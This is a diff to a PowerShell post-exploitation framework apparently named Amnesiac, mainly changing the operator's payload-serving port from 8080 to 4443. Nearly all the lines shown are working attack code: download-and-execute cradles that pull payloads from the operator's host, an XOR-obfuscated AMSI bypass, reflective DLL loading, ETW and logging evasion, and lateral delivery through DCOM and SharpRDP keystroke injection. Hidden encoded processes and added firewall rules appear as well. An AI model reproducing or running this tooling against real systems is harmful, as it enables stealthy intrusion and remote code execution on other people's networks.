@@ -201,7 +201,6 @@ function New-PayloadScript {
 
     $clientType = (& $splitStr 'System.IO.Pipes.NamedPipeCl') + "+'ientStream'"
     $serverType = (& $splitStr 'System.IO.Pipes.NamedPipeSer') + "+'verStream'"
-    $asmLoad = "[void][Reflection.Assembly]::LoadWithPartialName('System.Core')"
 
     $modVarBuf = & $rnd; $modVarLine = & $rnd; $modVarName = & $rnd
     $moduleHandler = (
@@ -272,7 +271,7 @@ function New-PayloadScript {
         )
     }
 
-    $rawScript = "$keyBlock;$asmLoad;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$pipeSetup;$loop"
+    $rawScript = "$keyBlock;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$pipeSetup;$loop"
 
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawScript)
     $ms    = [System.IO.MemoryStream]::new()
@@ -331,11 +330,11 @@ function Get-PayloadLauncher {
             $_dllFile  = "$_alNs.dll"
             if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
                 try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
-                $_rdpAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$global:IP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+                $_rdpAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$global:IP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
             } else {
                 $_rdpAmsi = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
             }
-            $_cradle = "iex(new-object net.webclient).downloadstring('http://$global:IP`:8080/pipe_$global:PipeName.ps1')"
+            $_cradle = "iex(new-object net.webclient).downloadstring('http://$global:IP`:4443/pipe_$global:PipeName.ps1')"
             return "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_cradle`""
         }
 
@@ -438,7 +437,7 @@ function Fetch-BinaryTool {
     }
     $exts = @('.exe', '.dll')
     foreach ($ext in $exts) {
-        if ($global:ListenerIP) { $urls += "http://$($global:ListenerIP):8080/$ToolName$ext" }
+        if ($global:ListenerIP) { $urls += "http://$($global:ListenerIP):4443/$ToolName$ext" }
         $urls += "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/$ToolName$ext"
     }
     foreach ($url in $urls) {
@@ -766,19 +765,19 @@ function Amnesiac {
 
     $_autoRoot = $global:AmnesiacRoot
     $_autoIP   = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
-    $_autoSrvScript = $FileServerScript + "`nFile-Server -Port 8080 -Path '$_autoRoot'"
+    $_autoSrvScript = $FileServerScript + "`nFile-Server -Port 4443 -Path '$_autoRoot'"
     $_autoBytes     = [System.Text.Encoding]::Unicode.GetBytes($_autoSrvScript)
     $_autoEnc       = [Convert]::ToBase64String($_autoBytes)
     $global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
         -ArgumentList "-ep Bypass", "-NoProfile", "-enc $_autoEnc" -PassThru
-    New-NetFirewallRule -Name "AmnesiacServe8080" -DisplayName "Amnesiac HTTP 8080" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080 -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -Name "AmnesiacServe4443" -DisplayName "Amnesiac HTTP 4443" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 4443 -ErrorAction SilentlyContinue | Out-Null
     $_autoPid = $global:FileServerProcess.Id
     $_autoParentPid = $PID
-    if (Test-Path (Join-Path $_autoRoot "Tools")) { $global:ServerURL = "http://$_autoIP`:8080/Tools" }
+    if (Test-Path (Join-Path $_autoRoot "Tools")) { $global:ServerURL = "http://$_autoIP`:4443/Tools" }
     $_autoMon = "while(`$true){Start-Sleep -Seconds 5;if(-not(Get-Process -Id $_autoParentPid -ErrorAction SilentlyContinue)){Stop-Process -Id $_autoPid -ErrorAction SilentlyContinue;break}}"
     $_autoMonEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($_autoMon))
     Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ep Bypass -enc $_autoMonEnc" -WindowStyle Hidden
-    Write-Host " [+] serve auto-started (PID $_autoPid) — http://$_autoIP`:8080/" -ForegroundColor Green
+    Write-Host " [+] serve auto-started (PID $_autoPid) — http://$_autoIP`:4443/" -ForegroundColor Green
 
 	if(!$ScanMode){$global:Message = " [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"}
 	
@@ -1147,7 +1146,7 @@ function Amnesiac {
 
 		# ---- bootstrap: assumed breach AMSI bypass one-liners + load command ----
 		if ($choice -eq 'bootstrap') {
-			$_srv = if ($global:ServerURL) { $global:ServerURL -replace '/Tools/?$','' } else { 'http://<operator-IP>:8080' }
+			$_srv = if ($global:ServerURL) { $global:ServerURL -replace '/Tools/?$','' } else { 'http://<operator-IP>:4443' }
 			$_load  = "iex (New-Object Net.WebClient).DownloadString('$_srv/Amnesiac_ShellReady.ps1');Amnesiac"
 			$_b1 = Get-AmsiBypassSnippet -Technique 'fail'
 			$_b2 = Get-AmsiBypassSnippet -Technique 'session'
@@ -1322,7 +1321,7 @@ function Amnesiac {
 		
 		if ($choice -like "Serve*") {
 			$commandParts = $choice -split '\s+', 2
-			$userdefPort  = if ($commandParts[1]) { [int]$commandParts[1] } else { 8080 }
+			$userdefPort  = if ($commandParts[1]) { [int]$commandParts[1] } else { 4443 }
 
 			if ($Detached) { $DefineHostname = $global:IP }
 			else { $DefineHostname = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName }
@@ -2380,20 +2379,20 @@ function Start-LocalShell {
                 if (-not (Test-Path $_toolsPath)) {
                     Write-Host " [!] Tools\ not found — only pipe files will be served" -ForegroundColor Yellow
                 } else {
-                    $global:ServerURL = "http://$_srvIP`:8080/Tools"
+                    $global:ServerURL = "http://$_srvIP`:4443/Tools"
                 }
-                $_srvScript = $FileServerScript + "`nFile-Server -Port 8080 -Path '$_serveRoot'"
+                $_srvScript = $FileServerScript + "`nFile-Server -Port 4443 -Path '$_serveRoot'"
                 $_srvBytes  = [System.Text.Encoding]::Unicode.GetBytes($_srvScript)
                 $_srvEnc    = [Convert]::ToBase64String($_srvBytes)
                 $global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
                     -ArgumentList "-ep Bypass", "-NoProfile", "-enc $_srvEnc" -PassThru
-                New-NetFirewallRule -Name "AmnesiacServe8080" -DisplayName "Amnesiac HTTP 8080" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080 -ErrorAction SilentlyContinue | Out-Null
+                New-NetFirewallRule -Name "AmnesiacServe4443" -DisplayName "Amnesiac HTTP 4443" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 4443 -ErrorAction SilentlyContinue | Out-Null
                 Write-Host " [+] serve started (PID $($global:FileServerProcess.Id))" -ForegroundColor Green
-                Write-Host " [*] Root:   http://$_srvIP`:8080/" -ForegroundColor Cyan
+                Write-Host " [*] Root:   http://$_srvIP`:4443/" -ForegroundColor Cyan
                 if (Test-Path $_toolsPath) { Write-Host " [*] Tools:  $global:ServerURL" -ForegroundColor Cyan }
-                Write-Host " [*] Loader: http://$_srvIP`:8080/Amnesiac_ShellReady.ps1" -ForegroundColor Cyan
+                Write-Host " [*] Loader: http://$_srvIP`:4443/Amnesiac_ShellReady.ps1" -ForegroundColor Cyan
                 if ($global:LastSharpRDPCradleFile) {
-                    Write-Host " [*] Pipe payload ready: http://$_srvIP`:8080/$($global:LastSharpRDPCradleFile)" -ForegroundColor Cyan
+                    Write-Host " [*] Pipe payload ready: http://$_srvIP`:4443/$($global:LastSharpRDPCradleFile)" -ForegroundColor Cyan
                 }
             }
             continue
@@ -2538,13 +2537,12 @@ function Start-LocalShell {
             if (-not $global:LastSharpRDPCradleFile) {
                 Write-Host " [!] No pipe payload — generate a stealth bind shell payload first." -ForegroundColor Yellow; continue
             }
-            $_dServeOk = $false
-            try { $_t2 = [Net.Sockets.TcpClient]::new(); $_t2.Connect('127.0.0.1', 8080); $_t2.Close(); $_dServeOk = $true } catch {}
+            $_dServeOk = ($null -ne $global:FileServerProcess -and -not $global:FileServerProcess.HasExited)
             if (-not $_dServeOk) {
                 Write-Host " [!] serve not running — DCOM delivery needs serve (target downloads payload via HTTP). Run 'serve' first." -ForegroundColor Red; continue
             }
             $_dOpIP   = if ($global:IP) { $global:IP } else { $env:COMPUTERNAME }
-            $_dCradle = "-nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://${_dOpIP}:8080/$global:LastSharpRDPCradleFile')`""
+            $_dCradle = "-nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://${_dOpIP}:4443/$global:LastSharpRDPCradleFile')`""
             $_dOk     = $false
             try {
                 if ($_dMethod -ieq 'ShellWindows') {
@@ -2611,7 +2609,7 @@ function Start-LocalShell {
                             # Omit inline AMSI bypass here — shorter command = more reliable Win+R keystroke injection.
                             # The pipe payload itself disables AMSI before executing; the bypass in the cradle is only
                             # needed if AMSI would block the DownloadString call (not the case in no-AV environments).
-                            $_srdpPS = "powershell -nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://${_srdpOpIP}:8080/$global:LastSharpRDPCradleFile')`""
+                            $_srdpPS = "powershell -nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://${_srdpOpIP}:4443/$global:LastSharpRDPCradleFile')`""
                             Write-Host " [*] Delivering via Win+R (use 'back' then wait for listener to catch the pipe)" -ForegroundColor Cyan
                             [SharpRDP.Program]::Main(@(
                                 "computername=$($_srdpF['computername'])",
@@ -2637,7 +2635,7 @@ function Start-LocalShell {
                             Write-Host " [*] command= value refreshed in clipboard." -ForegroundColor Cyan
                             if ($global:LastSharpRDPCradleFile) {
                                 $_opIP = if ($global:IP) { $global:IP } else { $env:COMPUTERNAME }
-                                Write-Host " [!] Ensure 'serve' is running — target fetches: http://$_opIP`:8080/$($global:LastSharpRDPCradleFile)" -ForegroundColor Yellow
+                                Write-Host " [!] Ensure 'serve' is running — target fetches: http://$_opIP`:4443/$($global:LastSharpRDPCradleFile)" -ForegroundColor Yellow
                             }
                         } else {
                             Write-Host " [*] No payload yet — generate a stealth bind shell payload first." -ForegroundColor Cyan
@@ -2839,7 +2837,7 @@ function Display-SessionMenu {
 		Write-Output " RepoURL                  Set Repo URL to Default"
 		Write-Output " RepoURL <URL>            Set Repo URL to specified URL"
 		Write-Output " scramble                 Rotate Global-Listener Pipe Name"
-		Write-Output " Serve                    Serve scripts from 0.0.0.0:8080"
+		Write-Output " Serve                    Serve scripts from 0.0.0.0:4443"
 		Write-Output " Serve <port> <folder>    Serve scripts from specified folder and port"
 		Write-Output " sessions                 Hide/Display Active Sessions"
 		Write-Output " switch                   Switch between SMB and WMI for Admin Access Scan"
@@ -3212,13 +3210,12 @@ while (`$true) {
 			$_liteConfig = @{} + $global:PayloadConfig
 			$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
 			$_servePS = (New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName -Config $_liteConfig).InlinePS
-			$_serveURL   = "http://$_srvIP`:8080/$_pipeFile"
+			$_serveURL   = "http://$_srvIP`:4443/$_pipeFile"
 			# [2] serve: iwr+scriptblock — no iex/new-object/webclient/downloadstring
 			$_srvCmdIwr  = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
 			$global:LastInlinePS = $built.InlinePS
 			[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
-			$_serveOk = $false
-			try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
+			$_serveOk = ($null -ne $global:FileServerProcess -and -not $global:FileServerProcess.HasExited)
 			Write-Output " [1] Inline PS -- full bypass payload, paste into existing session:"
 			Write-Output " $($built.InlinePS)"
 			Write-Output ""
@@ -3463,7 +3460,7 @@ while (`$true) {
 		$_liteConfig = @{} + $global:PayloadConfig
 		$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
 		$_servePS = (New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID -Config $_liteConfig).InlinePS
-		$_serveURL     = "http://$_operatorIP`:8080/$_pipeFile"
+		$_serveURL     = "http://$_operatorIP`:4443/$_pipeFile"
 		# [2] serve: iwr+scriptblock — no iex/new-object/webclient/downloadstring
 		$_srvCmdIwr    = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
 		$_sharpRDPCmd  = "command=powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
@@ -3473,8 +3470,7 @@ while (`$true) {
 		$global:LastSharpRDPB64 = $_sharpRDPCmd
 		$global:LastSharpRDPCradleFile = $_pipeFile
 		$global:LastInlinePS = $built.InlinePS
-		$_serveOk = $false
-		try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
+		$_serveOk = ($null -ne $global:FileServerProcess -and -not $global:FileServerProcess.HasExited)
 		Write-Output " [1] Inline PS -- full bypass payload, paste into existing session:"
 		Write-Output " $($built.InlinePS)"
 		Write-Output ""
@@ -3514,9 +3510,8 @@ while (`$true) {
 		# Warn if SharpRDP cradle was generated but serve isn't running — the target's
 		# downloadstring call will fail silently and no pipe will appear.
 		if ($global:LastSharpRDPCradleFile) {
-			# Check port 8080 for SharpRDP last-resort readiness only — winrm delivery doesn't need serve.
-			$_serveOk = $false
-			try { $t = [Net.Sockets.TcpClient]::new(); $t.Connect('127.0.0.1', 8080); $t.Close(); $_serveOk = $true } catch {}
+			# SharpRDP last-resort readiness only — winrm delivery doesn't need serve.
+			$_serveOk = ($null -ne $global:FileServerProcess -and -not $global:FileServerProcess.HasExited)
 			if ($_serveOk) {
 				Write-Host " [*] serve running — DCOM/SharpRDP last-resort ready: $global:LastSharpRDPCradleFile" -ForegroundColor Cyan
 			} else {
@@ -7544,7 +7539,7 @@ function File-Server {
 	
 	param($Port, $Path)
 	
-	if(!$Port){$Port = 8080}
+	if(!$Port){$Port = 4443}
 	if(!$Path){$Path = "c:\Users\Public\Documents\Amnesiac\Scripts"}
 
 	# Now create an instance of this server in PowerShell and start it
